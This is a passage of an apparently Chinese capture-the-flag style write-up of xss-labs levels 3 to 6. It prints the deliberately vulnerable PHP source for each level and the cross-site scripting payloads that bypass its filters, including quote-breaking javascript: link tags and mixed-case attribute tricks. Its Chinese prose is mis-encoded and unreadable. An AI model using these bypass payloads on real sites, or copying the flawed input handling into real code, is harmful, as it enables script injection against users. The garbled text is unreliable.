class=\"token punctuation\">></span></span><span class=\"token comment\">&lt;!--STATUS OK--></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>html</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>  <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>head</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>  <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>meta</span> <span class=\"token attr-name\">http-equiv</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>content-type<span class=\"token punctuation\">\"</span></span> <span class=\"token attr-name\">content</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>text/html;charset=utf-8<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>  <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>script</span><span class=\"token punctuation\">></span></span><span class=\"token script\"><span class=\"token language-javascript\"></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>  window<span class=\"token punctuation\">.</span><span class=\"token function-variable function\">alert</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">function</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>  </pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token punctuation\">&#123;</span>     </pre></td></tr><tr><td data-num=\"7\"></td><td><pre>  <span class=\"token function\">confirm</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"å®Œæˆçš„ä¸é”™ï¼\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>  window<span class=\"token punctuation\">.</span>location<span class=\"token punctuation\">.</span>href<span class=\"token operator\">=</span><span class=\"token string\">\"level4.php?keyword=try harder!\"</span><span class=\"token punctuation\">;</span> </pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>  </span></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>script</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>  <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>title</span><span class=\"token punctuation\">></span></span>æ¬¢è¿æ¥åˆ°level3<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>title</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>  <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>head</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>  <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>body</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>  <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>h1</span> <span class=\"token attr-name\">align</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span>center</span><span class=\"token punctuation\">></span></span>æ¬¢è¿æ¥åˆ°level3<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>h1</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>  <span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span> </pre></td></tr><tr><td data-num=\"16\"></td><td><pre>  <span class=\"token function\">ini_set</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"display_errors\"</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre><span class=\"token variable\">$str</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string double-quoted-string\">\"keyword\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre><span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"&lt;h2 align=center>æ²¡æœ‰æ‰¾åˆ°å’Œ\"</span><span class=\"token operator\">.</span><span class=\"token function\">htmlspecialchars</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$str</span><span class=\"token punctuation\">)</span><span class=\"token operator\">.</span>è¢«å¤„ç†<span class=\"token string double-quoted-string\">\"ç›¸å…³çš„ç»“æœ.&lt;/h2>\"</span><span class=\"token operator\">.</span><span class=\"token string double-quoted-string\">\"&lt;center></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>&lt;form action=level3.php method=GET></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>&lt;input name=keyword  value='\"</span><span class=\"token operator\">.</span><span class=\"token function\">htmlspecialchars</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$str</span><span class=\"token punctuation\">)</span><span class=\"token operator\">.</span><span class=\"token string double-quoted-string\">\"'>\tè¢«å¤„ç†</pre></td></tr><tr><td data-num=\"21\"></td><td><pre>&lt;input type=submit name=submit value=æœç´¢ /></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>&lt;/form></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>&lt;/center>\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre><span class=\"token delimiter important\">?></span></span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>center</span><span class=\"token punctuation\">></span></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>img</span> <span class=\"token attr-name\">src</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span>level3.png</span><span class=\"token punctuation\">></span></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>center</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span> </pre></td></tr><tr><td data-num=\"27\"></td><td><pre><span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"&lt;h3 align=center>payloadçš„é•¿åº¦:\"</span><span class=\"token operator\">.</span><span class=\"token function\">strlen</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$str</span><span class=\"token punctuation\">)</span><span class=\"token operator\">.</span><span class=\"token string double-quoted-string\">\"&lt;/h3>\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre><span class=\"token delimiter important\">?></span></span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>body</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>html</span><span class=\"token punctuation\">></span></span></pre></td></tr></table></figure><p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/xss/7.png\" alt=\"\"></p>\n<h4 id=\"ç¬¬å››å…³\"><a class=\"markdownIt-Anchor\" href=\"#ç¬¬å››å…³\">#</a> <span class=\"label\">ç¬¬å››å…³</span></h4>\n<p>å’Œç¬¬ä¸‰å…³ä¸€æ ·ä¸è¿‡è¿™å…³ç”¨åŒå¼•å·é—­åˆ</p>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/xss/8.png\" alt=\"\"></p>\n<p><span class=\"label\">ğŸ‘ä»£ç åˆ†æ</span></p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token doctype\"><span class=\"token punctuation\">&lt;!</span><span class=\"token doctype-tag\">DOCTYPE</span> <span class=\"token name\">html</span><span class=\"token punctuation\">></span></span><span class=\"token comment\">&lt;!--STATUS OK--></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>html</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>head</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>meta</span> <span class=\"token attr-name\">http-equiv</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>content-type<span class=\"token punctuation\">\"</span></span> <span class=\"token attr-name\">content</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>text/html;charset=utf-8<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>script</span><span class=\"token punctuation\">></span></span><span class=\"token script\"><span class=\"token language-javascript\"></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>window<span class=\"token punctuation\">.</span><span class=\"token function-variable function\">alert</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">function</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>  </pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token punctuation\">&#123;</span>     </pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token function\">confirm</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"å®Œæˆçš„ä¸é”™ï¼\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre> window<span class=\"token punctuation\">.</span>location<span class=\"token punctuation\">.</span>href<span class=\"token operator\">=</span><span class=\"token string\">\"level5.php?keyword=find a way out!\"</span><span class=\"token punctuation\">;</span> </pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre></span></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>script</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>title</span><span class=\"token punctuation\">></span></span>æ¬¢è¿æ¥åˆ°level4<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>title</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>head</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>body</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>h1</span> <span class=\"token attr-name\">align</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span>center</span><span class=\"token punctuation\">></span></span>æ¬¢è¿æ¥åˆ°level4<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>h1</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span> </pre></td></tr><tr><td data-num=\"16\"></td><td><pre><span class=\"token function\">ini_set</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"display_errors\"</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre><span class=\"token variable\">$str</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string double-quoted-string\">\"keyword\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre><span class=\"token variable\">$str2</span><span class=\"token operator\">=</span><span class=\"token function\">str_replace</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\">\"</span><span class=\"token punctuation\">,</span><span class=\"token string double-quoted-string\">\"\"</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$str</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token operator\">></span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre><span class=\"token variable\">$str3</span><span class=\"token operator\">=</span><span class=\"token function\">str_replace</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"&lt;\"</span><span class=\"token punctuation\">,</span><span class=\"token string double-quoted-string\">\"\"</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$str2</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token operator\">&lt;</span>è¢«è½¬æ¢ä¸ºç©º</pre></td></tr><tr><td data-num=\"20\"></td><td><pre><span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"&lt;h2 align=center>æ²¡æœ‰æ‰¾åˆ°å’Œ\"</span><span class=\"token operator\">.</span><span class=\"token function\">htmlspecialchars</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$str</span><span class=\"token punctuation\">)</span><span class=\"token operator\">.</span><span class=\"token string double-quoted-string\">\"ç›¸å…³çš„ç»“æœ.&lt;/h2>\"</span><span class=\"token operator\">.</span><span class=\"token string single-quoted-string\">'&lt;center></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>&lt;form action=level4.php method=GET></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>&lt;input name=keyword  value=\"'</span><span class=\"token operator\">.</span><span class=\"token variable\">$str3</span><span class=\"token operator\">.</span><span class=\"token string single-quoted-string\">'\"> åŒå¼•å·åŒ…è£¹</pre></td></tr><tr><td data-num=\"23\"></td><td><pre>&lt;input type=submit name=submit value=æœç´¢ /></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>&lt;/form></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>&lt;/center>'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre><span class=\"token delimiter important\">?></span></span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>center</span><span class=\"token punctuation\">></span></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>img</span> <span class=\"token attr-name\">src</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span>level4.png</span><span class=\"token punctuation\">></span></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>center</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span> </pre></td></tr><tr><td data-num=\"29\"></td><td><pre><span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"&lt;h3 align=center>payloadçš„é•¿åº¦:\"</span><span class=\"token operator\">.</span><span class=\"token function\">strlen</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$str3</span><span class=\"token punctuation\">)</span><span class=\"token operator\">.</span><span class=\"token string double-quoted-string\">\"&lt;/h3>\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre><span class=\"token delimiter important\">?></span></span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>body</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>html</span><span class=\"token punctuation\">></span></span></pre></td></tr></table></figure><p>&lt; &gt; è¢«è½¬æ¢ä¸ºç©ºäº†</p>\n<h4 id=\"ç¬¬äº”å…³\"><a class=\"markdownIt-Anchor\" href=\"#ç¬¬äº”å…³\">#</a> <span class=\"label\">ç¬¬äº”å…³</span></h4>\n<p>scrinpt è¢«æ›¿æ¢äº† ä½†æ˜¯ &lt;&gt; æ²¡æœ‰è¢«å¤„ç†</p>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/xss/9.png\" alt=\"\"></p>\n<p><code>å¯ä»¥ç”¨å…¶ä»–æ ‡ç­¾ä»£æ›¿&quot;&gt;&lt;ahref=&quot;javascript:alert(1);&quot;&gt;xss&lt;/a&gt;</code></p>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/xss/10.png\" alt=\"\"></p>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/xss/11.png\" alt=\"\"></p>\n<p>æ·»åŠ ä¸€ä¸ª a æ ‡ç­¾å†…å®¹å¼¹çª—ç‚¹å‡»è§¦å‘å¼¹çª—</p>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/xss/12.png\" alt=\"\"></p>\n<p><span class=\"label\">ğŸ‘ä»£ç åˆ†æ</span></p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token doctype\"><span class=\"token punctuation\">&lt;!</span><span class=\"token doctype-tag\">DOCTYPE</span> <span class=\"token name\">html</span><span class=\"token punctuation\">></span></span><span class=\"token comment\">&lt;!--STATUS OK--></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>html</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>head</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>meta</span> <span class=\"token attr-name\">http-equiv</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>content-type<span class=\"token punctuation\">\"</span></span> <span class=\"token attr-name\">content</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>text/html;charset=utf-8<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>script</span><span class=\"token punctuation\">></span></span><span class=\"token script\"><span class=\"token language-javascript\"></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>window<span class=\"token punctuation\">.</span><span class=\"token function-variable function\">alert</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">function</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>  </pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token punctuation\">&#123;</span>     </pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token function\">confirm</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"å®Œæˆçš„ä¸é”™ï¼\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre> window<span class=\"token punctuation\">.</span>location<span class=\"token punctuation\">.</span>href<span class=\"token operator\">=</span><span class=\"token string\">\"level6.php?keyword=break it out!\"</span><span class=\"token punctuation\">;</span> </pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre></span></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>script</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>title</span><span class=\"token punctuation\">></span></span>æ¬¢è¿æ¥åˆ°level5<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>title</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>head</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>body</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>h1</span> <span class=\"token attr-name\">align</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span>center</span><span class=\"token punctuation\">></span></span>æ¬¢è¿æ¥åˆ°level5<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>h1</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span> </pre></td></tr><tr><td data-num=\"16\"></td><td><pre><span class=\"token function\">ini_set</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"display_errors\"</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre><span class=\"token variable\">$str</span> <span class=\"token operator\">=</span> <span class=\"token function\">strtolower</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string double-quoted-string\">\"keyword\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre><span class=\"token variable\">$str2</span><span class=\"token operator\">=</span><span class=\"token function\">str_replace</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"&lt;script\"</span><span class=\"token punctuation\">,</span><span class=\"token string double-quoted-string\">\"&lt;scr_ipt\"</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$str</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre><span class=\"token variable\">$str3</span><span class=\"token operator\">=</span><span class=\"token function\">str_replace</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"on\"</span><span class=\"token punctuation\">,</span><span class=\"token string double-quoted-string\">\"o_n\"</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$str2</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre><span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"&lt;h2 align=center>æ²¡æœ‰æ‰¾åˆ°å’Œ\"</span><span class=\"token operator\">.</span><span class=\"token function\">htmlspecialchars</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$str</span><span class=\"token punctuation\">)</span><span class=\"token operator\">.</span><span class=\"token string double-quoted-string\">\"ç›¸å…³çš„ç»“æœ.&lt;/h2>\"</span><span class=\"token operator\">.</span><span class=\"token string single-quoted-string\">'&lt;center></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>&lt;form action=level5.php method=GET></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>&lt;input name=keyword  value=\"'</span><span class=\"token operator\">.</span><span class=\"token variable\">$str3</span><span class=\"token operator\">.</span><span class=\"token string single-quoted-string\">'\"></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>&lt;input type=submit name=submit value=æœç´¢ /></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>&lt;/form></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>&lt;/center>'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre><span class=\"token delimiter important\">?></span></span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>center</span><span class=\"token punctuation\">></span></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>img</span> <span class=\"token attr-name\">src</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span>level5.png</span><span class=\"token punctuation\">></span></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>center</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span> </pre></td></tr><tr><td data-num=\"29\"></td><td><pre><span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"&lt;h3 align=center>payloadçš„é•¿åº¦:\"</span><span class=\"token operator\">.</span><span class=\"token function\">strlen</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$str3</span><span class=\"token punctuation\">)</span><span class=\"token operator\">.</span><span class=\"token string double-quoted-string\">\"&lt;/h3>\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre><span class=\"token delimiter important\">?></span></span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>body</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>html</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre></pre></td></tr><tr><td data-num=\"34\"></td><td><pre>æŠŠ&lt;script å’Œon æ›¿æ¢ä¸º&lt;scr_ipt o_n æ‰€ä»¥ä¸å¯ç”¨</pre></td></tr></table></figure><h4 id=\"ç¬¬å…­å…³\"><a class=\"markdownIt-Anchor\" href=\"#ç¬¬å…­å…³\">#</a> <span class=\"label\">ç¬¬å…­å…³</span></h4>\n<p>è¾“å…¥ &quot;&gt;&lt;ahref=â€œjavascript:alert (1);â€&gt;xss</a></p>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/xss/13.png\" alt=\"\"></p>\n<p>href è¢«è¿‡æ»¤äº†å¯ä»¥å°è¯•ä¸€ä¸‹æŠŠ href å†™æˆå¤§å°å†™ hREf</p>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/xss/14.png\" alt=\"\"></p>\n<p>è¿™æ ·å°±æˆåŠŸç»•è¿‡äº†</p>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/xss/15.png\" alt=\"\"></p>\n<p><span class=\"label\">ğŸ‘ä»£ç åˆ†æ</span></p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token doctype\"><span class=\"token punctuation\">&lt;!</span><span class=\"token doctype-tag\">DOCTYPE</span> <span class=\"token name\">html</span><span class=\"token punctuation\">></span></span><span class=\"token comment\">&lt;!--STATUS OK--></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>html</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>head</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>meta</span> <span class=\"token attr-name\">http-equiv</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>content-type<span class=\"token punctuation\">\"</span></span> <span class=\"token attr-name\">content</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>text/html;charset=utf-8<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>script</span><span class=\"token punctuation\">></span></span><span class=\"token script\"><span class=\"token language-javascript\"></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>window<span class=\"token punctuation\">.</span><span class=\"token function-variable function\">alert</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">function</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>  </pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token punctuation\">&#123;</span>     </pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token function\">confirm</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"å®Œæˆçš„ä¸é”™ï¼\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre> window<span class=\"token punctuation\">.</span>location<span class=\"token punctuation\">.</span>href<span class=\"token operator\">=</span><span class=\"token string\">\"level7.php?keyword=move up!\"</span><span class=\"token punctuation\">;</span> </pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre></span></span><span class=\"token tag\"><span class=\"token tag\"><span 